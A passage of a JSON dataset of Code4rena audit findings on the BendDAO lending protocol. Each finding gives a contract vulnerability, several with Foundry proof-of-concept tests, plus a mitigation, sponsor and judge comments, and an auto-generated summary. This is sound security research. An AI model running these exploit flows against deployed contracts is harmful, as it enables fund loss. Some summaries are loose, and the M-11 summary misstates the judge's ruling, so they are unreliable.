      "content": "\nUser may revoke the underlying asset approval from the yield contract and prevent the `botAdmin` from repaying and closing his position. As a result, the debt will not be repaid, leaving the protocol at a loss.\n\n### Proof of Concept\n\nLet's take a closer look at the `_repay` function:\n\n```solidity\n  function _repay(uint32 poolId, address nft, uint256 tokenId) internal virtual {\n    RepayLocalVars memory vars;\n    ---SNIP---\n    // withdraw yield from protocol and repay if possible\n\n    vars.claimedYield = protocolClaimWithdraw(sd);\n\n    vars.nftDebt = _getNftDebtInUnderlyingAsset(sd);\n    vars.nftDebtWithFine = vars.nftDebt + sd.unstakeFine;\n\n    // compute repay value\n    if (vars.claimedYield >= vars.nftDebtWithFine) {\n      vars.remainAmount = vars.claimedYield - vars.nftDebtWithFine;\n    } else {\n>>    vars.extraAmount = vars.nftDebtWithFine - vars.claimedYield;\n    }\n\n    // transfer eth from sender\n    if (vars.extraAmount > 0) {\n>>    underlyingAsset.safeTransferFrom(vars.nftOwner, address(this), vars.extraAmount);\n    }\n\n    if (vars.remainAmount > 0) {\n      underlyingAsset.safeTransfer(vars.nftOwner, vars.remainAmount);\n    }\n\n    // repay lending pool\n    poolYield.yieldRepayERC20(poolId, address(underlyingAsset), vars.nftDebt);\n\n    poolYield.yieldSetERC721TokenData(poolId, nft, tokenId, false, address(underlyingAsset));\n\n    // update shares\n    accountYieldInWithdraws[address(vars.yieldAccout)] -= sd.withdrawAmount;\n    totalDebtShare -= sd.debtShare;\n\n    delete stakeDatas[nft][tokenId];\n\n    emit Repay(msg.sender, nft, tokenId, vars.nftDebt);\n  }\n```\n\nIf the yield collected by the position is not enough to cover the entire debt and fines, the protocol will attempt to collect `extraAmount` from the position owner, but he may revoke ERC20 approval and cancel the `safeTransferFrom` function call. As a result, `nftDebt` will not be repaid and will continue to collect interest, increasing the protocol's losses.\n\n### Recommended Mitigation Steps\n\nIt is recommended to separate the logic of debt repayment and NFT unlocking. The `_repay` function will reduce the debt of the position using the collected yield and unlock the NFT only if `extraAmount` is zero. In case `extraAmount` is greater than zero, leave the token locked and allow the NFT owner to unlock it only after he has repaid the remaining debt.\n\n**[thorseldon (BendDAO) confirmed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/9#issuecomment-2300176089):**\n > Fixed [here](https://github.com/BendDAO/bend-v2/commit/f06e1e13cf66526904a8da899be39b0f36481106).\n\n***\n\n",
      "summary": "\nThis bug report discusses a potential issue with the code of a yield contract. The issue is that a user may be able to revoke the approval for the underlying asset, which can prevent the contract from repaying the debt and closing the user's position. This can result in losses for the protocol. \n\nThe report includes a proof of concept that highlights the specific code causing the issue. It suggests separating the logic for debt repayment and NFT unlocking to prevent this issue from occurring. The report also mentions that the issue has been confirmed and fixed by the BendDAO team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/9",
      "tags": [],
      "finders": [
        "0x73696d616f",
        "SpicyMeatball"
      ]
    },
    {
      "id": "36897",
      "title": "[M-15] It's impossible to retrieve collected fines from the yield staking contract",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-07-benddao/blob/main/src/yield/YieldStakingBase.sol#L329-L337><br><https://github.com/code-423n4/2024-07-benddao/blob/main/src/yield/YieldStakingBase.sol#L407><br><https://github.com/code-423n4/2024-07-benddao/blob/main/src/yield/YieldStakingBase.sol#L426>\n\n### Impact\n\nNo means to retrieve collected fines from the staking contract.\n\n### Proof of Concept\n\nIf `botAdmin` forcefully unstakes a position, a staker will have to pay an additional fine when the stake is repayed:\n\n```solidity\n  function _repay(uint32 poolId, address nft, uint256 tokenId) internal virtual {\n    ---SNIP---\n\n    vars.nftDebt = _getNftDebtInUnderlyingAsset(sd);\n>>  vars.nftDebtWithFine = vars.nftDebt + sd.unstakeFine;\n\n    // compute repay value\n    if (vars.claimedYield >= vars.nftDebtWithFine) {\n      vars.remainAmount = vars.claimedYield - vars.nftDebtWithFine;\n    } else {\n      vars.extraAmount = vars.nftDebtWithFine - vars.claimedYield;\n    }\n\n    // transfer eth from sender\n    if (vars.extraAmount > 0) {\n>>    underlyingAsset.safeTransferFrom(vars.nftOwner, address(this), vars.extraAmount);\n    }\n\n    if (vars.remainAmount > 0) {\n      underlyingAsset.safeTransfer(vars.nftOwner, vars.remainAmount);\n    }\n\n    // repay lending pool\n>>  poolYield.yieldRepayERC20(poolId, address(underlyingAsset), vars.nftDebt);\n\n    poolYield.yieldSetERC721TokenData(poolId, nft, tokenId, false, address(underlyingAsset));\n\n    // update shares\n    accountYieldInWithdraws[address(vars.yieldAccout)] -= sd.withdrawAmount;\n    totalDebtShare -= sd.debtShare;\n\n    delete stakeDatas[nft][tokenId];\n\n    emit Repay(msg.sender, nft, tokenId, vars.nftDebt);\n  }\n```\n\nNote that the user's total debt consists of the actual NFT debt and the fine. When the stake is paid off, only the `nftDebt` is sent to the pool, and the `unstakeFine` remains in the contract. However, there are no functions that send the collected funds to the admin, and so they will remain in the contract forever.\n\n### Recommended Mitigation Steps\n\nImplement a function that allows admin to collect fines from the yield staking contract.\n\n### Assessed type\n\nToken-Transfer\n\n**[thorseldon (BendDAO) confirmed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/10#issuecomment-2297851634):**\n > Fixed [here](https://github.com/BendDAO/bend-v2/commit/80d3bb38dd6eaed5438f4bb63f6dac348741bbaf).\n\n***\n\n",
      "summary": "\nThis bug report is about a staking contract that does not have a way to retrieve collected fines. This means that if a user's stake is forcefully unstaked by the botAdmin, they will have to pay an additional fine when they want to get their stake back. The code provided in the report shows that the fine is not being transferred to the admin, so it will remain in the contract forever. To fix this, the report recommends implementing a function for the admin to collect fines from the contract. The type of bug is classified as a Token-Transfer issue and has been confirmed and fixed by the BendDAO team. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/10",
      "tags": [],
      "finders": [
        "0x73696d616f",
        "bin2chen",
        "oakcobalt",
        "SpicyMeatball"
      ]
    },
    {
      "id": "36896",
      "title": "[M-14] Incorrect accounting of utilization, supply/borrow rates due to vulnerable implementation in `IsolateLogic::executeIsolateLiquidate`",
      "impact": "MEDIUM",
      "content": "\nWhen an isolate loan (borrow against a single nft token) is auctioned and liquidated, the liquidator (caller of `IsolateLogic::executeIsolateLiquidate`) may need to repay extra amount of debt (`vars.totalExtraAmount`) if the bid amount doesn't fully cover total debt (`vars.totalBorrowAmount`).\n\nThe problem is the above case is not correctly implemented when interests rates are updated (`InterestLogic.updateInterestRates(poolData, debtAssetData, (vars.totalBorrowAmount + vars.totalExtraAmount), 0)`).\n\nIn `InterestLogic::updateInterestRates`, utilization is recalculated based on `liquidityAdded` and `liquidityTaken`. In the context of `IsolateLogic::executeIsolateLiquidate`, the `liquidtyAdded` for a loan is the repayment of debt (`vars.borrowAmount`) which includes `loanData.bidAmount + extraAmount`.\n\n```solidity\n//src/libraries/logic/IsolateLogic.sol\n  function executeIsolateLiquidate(InputTypes.ExecuteIsolateLiquidateParams memory params) internal {\n...\n    for (vars.nidx = 0; vars.nidx < params.nftTokenIds.length; vars.nidx++) {\n...\n      // Last bid can not cover borrow amount and liquidator need pay the extra amount\n      if (loanData.bidAmount < vars.borrowAmount) {\n|>      vars.extraBorrowAmounts[vars.nidx] = vars.borrowAmount - loanData.bidAmount;//@audit-info note: vars.borrowAmount = extraAmount + loanData.bidAmount\n      }\n...\n    // update interest rate according latest borrow amount (utilization)\n      //@audit (vars.totalBorrowAmount + vars.totalExtraAmount) is incorrect input, which inflates `liquidityAdded` in updateInterestRates.\n|>    InterestLogic.updateInterestRates(poolData, debtAssetData, (vars.totalBorrowAmount + vars.totalExtraAmount), 0);\n\n    // bid already in pool and now repay the borrow but need to increase liquidity\n      //@audit-info note: only total debt (vars.totalBorrowAmount) are added to liquidity.\n|>    VaultLogic.erc20TransferOutBidAmountToLiqudity(debtAssetData, vars.totalBorrowAmount);\n...\n```\n\nhttps://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/libraries/logic/IsolateLogic.sol#L461\n\nIn `InterestLogic::updateInterestRates`, (`vars.totalBorrowAmount + vars.totalExtraAmount`) inflates `liquidityAdded`, which inflates `vars.availableLiquidityPlusDebt` and deflates utilization rate `vars.assetUtilizationRate`. This will cause an inflated borrow rate/supply rate based on the interest rate model.\n\n```solidity\n\n  function updateInterestRates(\n    DataTypes.PoolData storage poolData,\n    DataTypes.AssetData storage assetData,\n    uint256 liquidityAdded,\n    uint256 liquidityTaken\n  ) internal {\n...\n    // calculate the total asset supply\n    vars.availableLiquidityPlusDebt =\n      assetData.availableLiquidity +\n|>    liquidityAdded -\n      liquidityTaken +\n      vars.totalAssetDebt;\n    if (vars.availableLiquidityPlusDebt > 0) {\n      vars.assetUtilizationRate = vars.totalAssetDebt.rayDiv(vars.availableLiquidityPlusDebt);\n    }\n...\n      vars.nextGroupBorrowRate = IInterestRateModel(loopGroupData.rateModel).calculateGroupBorrowRate(\n        vars.loopGroupId,\n        vars.assetUtilizationRate\n      );\n...\n```\n\nhttps://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/libraries/logic/InterestLogic.sol#L165\n\nFlows: `IsolateLiquidation::isolateLiquidate -> IsolateLogic.executeIsolateLiquidate -> InterestLogic.updateInterestRates`\n\n### Recommended Mitigation Steps\n\nConsider changing into `InterestLogic.updateInterestRates(poolData, debtAssetData, vars.totalBorrowAmount, 0)`.\n\n### Assessed type\n\nError\n\n**[thorseldon (BendDAO) confirmed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/12#issuecomment-2297852310):**\n > Fixed [here](https://github.com/BendDAO/bend-v2/commit/d5747d8e60bb138c8ddbfcb85dd58ad4e3e72785).\n\n***\n\n",
      "summary": "\nThe bug occurs when an isolate loan is auctioned and liquidated. The liquidator may have to repay extra debt if the bid amount does not cover the total debt. This issue is caused by incorrect implementation when interest rates are updated. The utilization is recalculated based on the liquidity added and taken, but in this case, the liquidity added is the repayment of debt which includes the bid amount and extra amount. This results in an inflated borrow rate and supply rate. To mitigate this issue, it is recommended to change the input in the `updateInterestRates` function. The type of this bug is an error. The bug has been confirmed and fixed by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/12",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "36895",
      "title": "[M-13] Major insolvency risk in `LiquidationLogic::executeCrossLiquidateERC721()` due to not setting a maximum liquidation price",
      "impact": "MEDIUM",
      "content": "\nWhenever the price of a nft suffers a significant drop or the debt asset increases in price, there is a threshold after which liquidations are not profitable at all for the liquidator. Moreover, it does not offer the possibility of partial liquidation to at least partially mitigate this issue.\n\n### Proof of Concept\n\nIn `LiquidationLogic::executeCrossLiquidateERC721()`, the actual debt to liquidate is calculated in [`LiquidationLogic::_calculateDebtAmountFromERC721Collateral()`](https://github.com/code-423n4/2024-07-benddao/blob/main/src/libraries/logic/LiquidationLogic.sol#L202). [Here](https://github.com/code-423n4/2024-07-benddao/blob/main/src/libraries/logic/LiquidationLogic.sol#L500), it calculates the price of the liquidated nft by dividing the debt by the number of collateral tokens the user has. The problem with this approach is that it places no upper limit on the price, such that if the debt increases to much or the nft price suffers a sudden loss; the price of each nft would be too high. The amount of debt to repay is calculated based on this price, so it would make no sense for liquidators to pay an inflated amount for each nft.\n\nAdditionally, it's possible to liquidate only a selected amount of nfts at a time by setting `params.collateralTokenIds.length` to less than the nft balance of the borrower, but it always sells them to the liquidator at the same inflated price. Thus, it's impossible to use this mechanism to repay some amount of debt at a profitable price for the liquidator.\n\nPlace the following test in `TestIntCrossLiquidateERC721.t.sol`, confirming that the liquidator takes a big loss if the price of the nft collateral drops significantly.\n\n```solidity\nfunction test_POC_RepayUSDT_HasBAYC_InflatedPrice() public {\n  prepareUSDT(tsDepositor1);\n\n  uint256[] memory depTokenIds = prepareCrossBAYC(tsBorrower1);\n\n  TestUserAccountData memory accountDataBeforeBorrow = getUserAccountData(address(tsBorrower1), tsCommonPoolId);\n\n  // borrow some eth\n  uint8[] memory borrowGroups = new uint8[](1);\n  borrowGroups[0] = tsLowRateGroupId;\n\n  uint256[] memory borrowAmounts = new uint256[](1);\n  borrowAmounts[0] =\n    (accountDataBeforeBorrow.availableBorrowInBase * (10 ** tsUSDT.decimals())) /\n    tsPriceOracle.getAssetPrice(address(tsUSDT));\n\n  actionCrossBorrowERC20(\n    address(tsBorrower1),\n    tsCommonPoolId,\n    address(tsUSDT),\n    borrowGroups,\n    borrowAmounts,\n    new bytes(0)\n  );\n\n  // make some interest\n  advanceTimes(365 days);\n\n  // drop down price and lower health factor\n  uint256 baycCurPrice = tsBendNFTOracle.getAssetPrice(address(tsBAYC));\n  uint256 baycNewPrice = (baycCurPrice * 60) / 100;\n  tsBendNFTOracle.setAssetPrice(address(tsBAYC), baycNewPrice);\n\n  TestUserAccountData memory accountDataAfterBorrow = getUserAccountData(address(tsBorrower1), tsCommonPoolId);\n  assertLt(accountDataAfterBorrow.healthFactor, 1e18, 'ACC:healthFactor');\n\n  (uint256 actualCollateralToLiquidate, uint256 actualDebtToLiquidate) = tsPoolLens.getUserCrossLiquidateData(\n    tsCommonPoolId,\n    address(tsBorrower1),\n    address(tsBAYC),\n    1,\n    address(tsUSDT),\n    0\n  );\n\n  uint256 tsBAYCprice = tsPriceOracle.getAssetPrice(address(tsBAYC));\n  uint256 tsUSDTprice = tsPriceOracle.getAssetPrice(address(tsUSDT));\n  assertEq(tsBAYCprice, 3822840829686);\n  assertEq(tsUSDTprice, 100053000);\n\n  uint256 collateralValue = tsBAYCprice;\n  uint256 debtValue = actualDebtToLiquidate * tsUSDTprice / 1e6;\n  assertEq(debtValue, 4300008062440, 'actualDebtToLiquidate');\n  assertEq(debtValue * 100 / collateralValue, 112); //@audit debt is worth 112% of collateral, not worth it\n\n  assertGt(actualDebtToLiquidate, 0, 'actualDebtToLiquidate');\n  assertGt(actualCollateralToLiquidate, 0, 'actualCollateralToLiquidate');\n  \n  // liquidate some eth\n  tsLiquidator1.approveERC20(address(tsUSDT), type(uint256).max);\n\n  uint256[] memory liqTokenIds = new uint256[](1);\n  liqTokenIds[0] = depTokenIds[0];\n\n  actionCrossLiquidateERC721(\n    address(tsLiquidator1),\n    tsCommonPoolId,\n    address(tsBorrower1),\n    address(tsBAYC),\n    liqTokenIds,\n    address(tsUSDT),\n    false,\n    new bytes(0)\n  );\n}\n```\n\n### Tools Used\n\nVscode, Foundry\n\n### Recommended Mitigation Steps\n\nCap the price per nft of the liquidation to a reasonable value so liquidators can at least repay some of the token ids of the position. This is how it works for `ERC20` liquidations, for example, in which the maximum debt to repay is calculated based on the maximum collateral balance sold at a discount.\n\n**[thorseldon (BendDAO) acknowledged and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/22#issuecomment-2297859644):**\n > In our current service design: We want NFT assets to bear corresponding debts according to their collateral value, and try to avoid the bad debt.\n>\n> The final bad debt will be covered the DAO treasury which comes from protocol income.\n>\n> We suggest adjust the severity level to informative, because this belong to service design which can be optimised in the future.\n\n**[0xTheC0der (judge) commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/22#issuecomment-2299313253):**\n > Having the DAO treasury cover bad debt from protocol income is a protocol internal design decisions which doesn't immediately put users at risk or allows direct theft of funds. Therefore, I agree with the sponsor.\n >\n> Seems to fall below `Questioning the protocol’s business model is unreasonable.`\n\n**[0x73696d616f (warden) commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/22#issuecomment-2304732459):**\n > @0xTheC0der - the protocol means they will take unfavourable liquidations to cover for their users. This was not documented so the issue should be valid, as it is a serious risk for BendDao.\n > \n> As far as the docs and code were concerned (not mentioning treasury intervention to clear bad debt), this is a high severity issue.\n\n**[0xTheC0der (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/22#issuecomment-2304949814):**\n > Similar reasoning as in [Issue #23](https://github.com/code-423n4/2024-07-benddao-findings/issues/23). But ERC721 instead of ERC20 instance.\n> \n> However, Medium severity seems more justified in this case given the discussed impacts in contrast to #23 which discusses impacts more thoroughly (e.g., withdrawal DoS).\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue in the BendDAO protocol where liquidators may suffer significant losses when trying to liquidate a borrower's assets. This occurs when the price of an NFT asset drops or the debt asset increases in price, resulting in an inflated price for each NFT. The report suggests capping the price of each NFT to mitigate this issue. The severity of this issue is debated among the developers, with some suggesting it is a high severity issue that puts users at risk, while others argue it is a medium severity issue that can be addressed in the future. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/22",
      "tags": [],
      "finders": [
        "0x73696d616f"
      ]
    },
    {
      "id": "36894",
      "title": "[M-12]  No check if Arbitrum/Optimism L2 sequencer is down in Chainlink feeds `PriceOracle.sol`",
      "impact": "MEDIUM",
      "content": "\nChainlink recommends that all Optimistic L2 oracles consult the Sequencer Uptime Feed to ensure that the sequencer is live before trusting the data returned by the oracle.\n\nIf the Arbitrum Sequencer goes down, oracle data will not be kept up to date, and thus could become stale. However, users are able to continue to interact with the protocol directly through the L1 optimistic rollup contract. You can review Chainlink docs on [L2 Sequencer Uptime Feeds](https://docs.chain.link/docs/data-feeds/l2-sequencer-feeds/) for more details on this.\n\nThis protocol uses `getPriceOracle()` everywhere and it sub call to [`PriceOracle.sol#latestRoundData()`](https://github.com/code-423n4/2024-07-benddao/blob/main/src/PriceOracle.sol#L122). As a result, users may be able to use the protocol while Oracle feeds are stale. This could cause many problems, for example:\n\n- A user has a loan with 100 tokens, valued at 1 ETH each, and no borrows.\n- The Arbitrum sequencer goes down temporarily.\n- While it's down, the price of the token falls to 0.5 ETH each.\n- The current value of the user's loan is 50 ETH, so the liquidators should be able to liquidate this position because it is unhealthy.\n- However, due to the stale price, the protocol lets the user keep borrowing.\n\n### Impact\n\nIf the Arbitrum sequencer goes down, the protocol will allow users to continue to operate at the previous (stale) prices. This will break all the core functionality in the protocol.\n\n### Tools Used\n\nSolodit\n\n### Recommended Mitigation Steps\n\nIt is recommended to follow the code example of Chainlink [here](https://docs.chain.link/data-feeds/l2-sequencer-feeds#example-code) or just add this check:\n\n```solidity\nFile: PriceOracle.sol\n\nfunction getAssetPriceFromChainlink(address asset) public view returns (uint256) {\n   AggregatorV2V3Interface sourceAgg = assetChainlinkAggregators[asset];\n   require(address(sourceAgg) != address(0), Errors.ASSET_AGGREGATOR_NOT_EXIST);\n   if (!isSequencerActive()) revert Errors.L2SequencerUnavailable();\n\n    ...\n}\n\nfunction isSequencerActive() internal view returns (bool) {\n    (, int256 answer, uint256 startedAt,,) = sequencer.latestRoundData();\n    if (block.timestamp - startedAt <= GRACE_PERIOD_TIME || answer == 1)\n        return false;\n    return true;\n}\n```\n\n### Assessed type\n\nOracle\n\n**[thorseldon (BendDAO) acknowledged and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/24#issuecomment-2297864124):**\n> Checking the stale interval or grace period of oracle price, it's maybe better do this as suggested, but it's hard to set or predict the appropriate interval time.\n> \n> We suggest adjust the severity level to informative.\n\n***\n\n",
      "summary": "\nThis bug report is about a potential issue with the Chainlink protocol that could cause problems if the Arbitrum Sequencer goes down. The report recommends implementing a check to ensure that the Sequencer is live before trusting the data returned by the oracle. The impact of this issue could be significant as it could break core functionality in the protocol. The recommended mitigation steps include following the code example provided by Chainlink or adding a check to the code. The type of bug assessed is an Oracle bug. The report also includes a comment from the BendDAO team acknowledging the issue and suggesting an adjustment to the severity level.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/24",
      "tags": [],
      "finders": [
        "bin2chen",
        "Ch\\_301",
        "oakcobalt"
      ]
    },
    {
      "id": "36893",
      "title": "[M-11] Updating asset collateral params can lead to liquidate borrowers arbitrarily",
      "impact": "MEDIUM",
      "content": "\nOne of the key concepts in this protocol is **Cross Lending** when the contract will calculate the health-factor of the account. If it is unhealthy, the liquidator can repay the debt on behalf of the borrower and take their collateral assets at a certain discount price.\n\nThe protocol has two main factors to calculate the health-factor for users; the `collateralFactor` and `liquidationThreshold` values are unique for each pool and asset. Also, the `PoolAdmin` can update them at any time by triggering `Configurator.sol#setAssetCollateralParams()`.\n\nThe responsibility for computing health-factor is `GenericLogic.sol#calculateUserAccountData()`, which calculates the user data across the reserves. However, the current logic uses `liquidationThreshold` value also to check if the asset will not be used as collateral (but still, users can supply/lend it to be borrowed and earn interest).\n\n```solidity\nFile: GenericLogic.sol#calculateUserAccountData()\n\n      if (currentAssetData.liquidationThreshold != 0) {\n       /***/\n        result.totalCollateralInBaseCurrency += vars.userBalanceInBaseCurrency;\n       /***/\n      }\n```\n\nThe issue is the `PoolAdmin` can call `Configurator.sol#setAssetCollateralParams()` at any time to disable accepting an asset as collateral by updating `collateralFactor` and `liquidationThreshold` to zero value. So, users suddenly will get liquidated directly by MEV bots.\n\n### Impact\n\n- The `PoolAdmin` can update the asset collateral params. This will leave borrowers with bad debt and allow the liquidators to liquidate all the loans.\n- MEV bots will just back-run the `setAssetCollateralParams()` transaction to liquidate users; they have no chance to update their positions.\n\n### Proof of Concept\n\nFoundry PoC - Please copy the following POC in `TestIntCrossLiquidateERC20.t.sol`:\n\n```solidity\nfunction test_Should_LiquidateUSDT_executeSetAssetCollateralParams() public {\n    prepareUSDT(tsDepositor1);\n    //? 1- borrower supply tsWETH as collateral\n    prepareWETH(tsBorrower1);\n\n    TestUserAccountData memory accountDataBeforeBorrow = getUserAccountData(address(tsBorrower1), tsCommonPoolId);\n\n    // borrow some eth\n    uint8[] memory borrowGroups = new uint8[](1);\n    borrowGroups[0] = tsLowRateGroupId;\n\n    uint256[] memory borrowAmounts = new uint256[](1);\n    uint256 usdtCurPrice = tsPriceOracle.getAssetPrice(address(tsUSDT));\n    borrowAmounts[0] = (accountDataBeforeBorrow.availableBorrowInBase * (10 ** tsUSDT.decimals())) / usdtCurPrice;\n\n    //? 2- the borrower call `crossBorrowERC20()` to borrow `tsUSDT`\n    actionCrossBorrowERC20(\n      address(tsBorrower1),\n      tsCommonPoolId,\n      address(tsUSDT),\n      borrowGroups,\n      borrowAmounts,\n      new bytes(0)\n    );\n\n    // make some interest\n    advanceTimes(1 days);\n\n    //? 3- set `liquidationThreshold` to zero\n    tsHEVM.startPrank(tsPoolAdmin);\n    tsConfigurator.setAssetCollateralParams(tsCommonPoolId, address(tsWETH), 0, 0, 0);\n    tsHEVM.stopPrank();\n\n    //? 4- liquidator call `crossLiquidateERC20()` with `collateralAsset == tsWETH`\n    tsLiquidator1.approveERC20(address(tsUSDT), type(uint256).max);\n    uint daiBlanceBefore = ERC20(address(tsWETH)).balanceOf(address(tsLiquidator1));\n\n    tsHEVM.prank(address(tsLiquidator1));\n    tsCrossLiquidation.crossLiquidateERC20(\n      tsCommonPoolId,\n      address(tsBorrower1),\n      address(tsWETH),\n      address(tsUSDT),\n      borrowAmounts[0],\n      false\n    );\n\n    uint daiBlanceAfter = ERC20(address(tsWETH)).balanceOf(address(tsLiquidator1));\n\n    assertGt(daiBlanceAfter, daiBlanceBefore);\n  }\n```\n\n### Recommended Mitigation Steps\n\nIn case the `PoolAdmin` decides to no longer accept an asset as collateral, users who are using this asset as collateral should have a period of time to update their loans. You can use a buffer period or lock time to do this critical update.\n\n**[thorseldon (BendDAO) disputed](https://github.com/code-423n4/2024-07-benddao-findings/issues/26#event-13919820386)**\n\n**[0xTheC0der (judge) commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/26#issuecomment-2296148129):**\n > Seems like a valid concern. @thorseldon, could you please provide more context concerning your dispute? \n>\n > After a second thought, this seems to fall below `Centralisation Risk on Contracts which has Owner or Administrator` according to the `README`.\n\n**[0xTheC0der (judge) commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/26#issuecomment-2296869941):**\n > After a third thought, this is exceeding centralization risks, since it's never a good time to change asset collateral params. The params should be cached for ongoing borrows.\n\n**[thorseldon (BendDAO) commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/26#issuecomment-2297870358):**\n > This a parameter configuration which controlled by the DAO governance, any parameters like liquidation threshold should be carefully discussed and reviewed the community and dev team.\n> \n> We will use timelock to schedule the configuration updating if the proposal voting is passed.\n\n**[0xTheC0der (judge) commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/26#issuecomment-2298716320):**\n > I understand the centralization concern of this issue is out of scope and changes are carefully reviewed. However, on a contract level:  \n> - Even carefully considered changes do directly affect open borrow positions. Therefore, there is never/seldom a good time to change these values.\n> - It is not ensured on a contract level that e.g. liquidation threshold changes can only happen in favor of the users and not against them.  \n> \n> For these reasons, Medium severity seems justified.\n\n***\n\n",
      "summary": "\nThe bug report discusses a potential issue with the protocol's **Cross Lending** feature, specifically with the calculation of the health-factor for user accounts. The issue arises when the `PoolAdmin` updates the `collateralFactor` and `liquidationThreshold` values to zero, which can result in borrowers being liquidated by MEV bots. This can leave borrowers with bad debt and allow liquidators to take all of their loans. The report suggests using a time lock or buffer period to allow users to update their loans before any changes are made to the collateral parameters. The judges have determined that this issue falls under the category of centralization risk and should be carefully reviewed and discussed by the community and development team. They also suggest that changes to these parameters should only be made in favor of the users, not against them. Overall, the severity of this issue is considered to be medium.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/26",
      "tags": [],
      "finders": [
        "Ch\\_301"
      ]
    },
    {
      "id": "36892",
      "title": "[M-10] `isolateRedeem()` revert in case Revert-on-zero-value-transfers tokens",
      "impact": "MEDIUM",
      "content": "\nOne of the features of this protocol is that the borrower can redeem his loan (under the **Isolate Lending**) after his loan goes into auction state (before the end of the auction) by simply invoking `IsolateLiquidation.sol#isolateRedeem()`. However, in order to keep the liquidators incentivized to launch the auction for any bad debt, the borrower could get forced to pay them some fee (called `bidFine`).\n\nThe `bidFine` is defined by two factors `bidFineFactor` and `minBidFineFactor`, both of them are updatable from `Configurator.sol#setAssetAuctionParams()`,\n\nIn case admin set them to zero, when the borrower tries to redeem his loan this logic from `IsolateLogic.sol#executeIsolateRedeem()`:\n\n```solidity\nFile: IsolateLogic.sol#executeIsolateRedeem()\n\n328:       (, vars.bidFines[vars.nidx]) = GenericLogic.calculateNftLoanBidFine(\n329:         debtAssetData,\n330:         debtGroupData,\n331:         nftAssetData,\n332:         loanData,\n333:         vars.priceOracle\n334:       );\n\n```\n\nwill set the value of `vars.bidFines[vars.nidx]` to zero. After that, the flow will enter this `IF` block to transfer the `bidFine` to the liquidator who launched the auction.\n\n```solidity\nFile: IsolateLogic.sol#executeIsolateRedeem()\n\n346:       if (loanData.firstBidder != address(0)) {\n347:         // transfer bid fine from borrower to the first bidder\n348:         VaultLogic.erc20TransferBetweenWallets(\n349:           params.asset,\n350:           params.msgSender,\n351:           loanData.firstBidder,\n352:           vars.bidFines[vars.nidx]\n353:         );\n354:       }\n```\n\nIn case `params.asset` is one of Revert-on-Zero-Value-Transfers tokens (in scope),\nthe transaction will revert because it is trying to transfer zero value `vars.bidFines[vars.nidx] == 0`.\n\n### Impact\n\nThe borrower will never be able to redeem his loan after his loan goes into auction state.\n\n### Recommended Mitigation Steps\n\n```diff\nFile: IsolateLogic.sol#executeIsolateRedeem()\n\n- 346:       if (loanData.firstBidder != address(0)) {\n+ 346:       if (loanData.firstBidder != address(0) && vars.bidFines[vars.nidx] > 0) {\n347:         // transfer bid fine from borrower to the first bidder\n348:         VaultLogic.erc20TransferBetweenWallets(\n349:           params.asset,\n350:           params.msgSender,\n351:           loanData.firstBidder,\n352:           vars.bidFines[vars.nidx]\n353:         );\n354:       }\n```\n\n### Assessed type\n\nERC20\n\n**[thorseldon (BendDAO) confirmed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/30#issuecomment-2297877086):**\n > Fixed [here](https://github.com/BendDAO/bend-v2/commit/b991f603e786eabee94d16926c4198a11b3276d6).\n\n***\n\n",
      "summary": "\nThis bug report discusses a feature of a protocol that allows borrowers to redeem their loans before the auction ends. However, there is a problem with the calculation of a fee that borrowers must pay to incentivize liquidators to launch the auction. If the fee is set to zero, the borrower will not be able to redeem their loan. The recommended solution is to update the code to check for a non-zero fee before transferring it to the liquidator. This bug affects ERC20 tokens and has been fixed by the project team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/30",
      "tags": [],
      "finders": [
        "Ch\\_301"
      ]
    },
    {
      "id": "36891",
      "title": "[M-09] User are forced to borrow again in order to unlock their NFTs from `IsolateLending.sol`",
      "impact": "MEDIUM",
